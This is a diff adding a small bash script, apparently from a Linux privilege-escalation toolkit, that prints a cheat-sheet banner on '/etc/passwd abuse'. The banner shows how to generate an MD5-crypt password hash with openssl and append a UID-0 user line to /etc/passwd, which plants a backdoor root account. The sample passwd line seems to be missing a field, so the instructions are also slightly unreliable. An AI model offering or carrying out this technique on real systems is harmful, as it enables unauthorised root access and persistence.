@@ -1,0 +1,15 @@
+#!/bin/bash
+
+function info_etcpasswd_abuse(){
+
+	printf -- "##########################################################################################################\n"
+        printf -- "#  /etc/passwd ABUSE                                                                                     #\n"
+        printf -- "#  1.Create user and password with openssl (other program with same functionality should work)           #\n"
+        printf -- "#  openssl passwd -1 -salt sauron root                                                                   #\n"
+        printf -- "#  2.Copy output should look like this \$1\$sauron\$sjmnnkTIV2aPfzkH1WufS/   to /etc/passwd file as shown:  #\n"
+        printf -- "#  sauron:\$1\$sauron\$sjmnnkTIV2aPfzkH1WufS/:0:0:/root/root:/bin/bash                                      #\n"
+        printf -- "##########################################################################################################\n\n"
+
+}
+
+info_etcpasswd_abuse
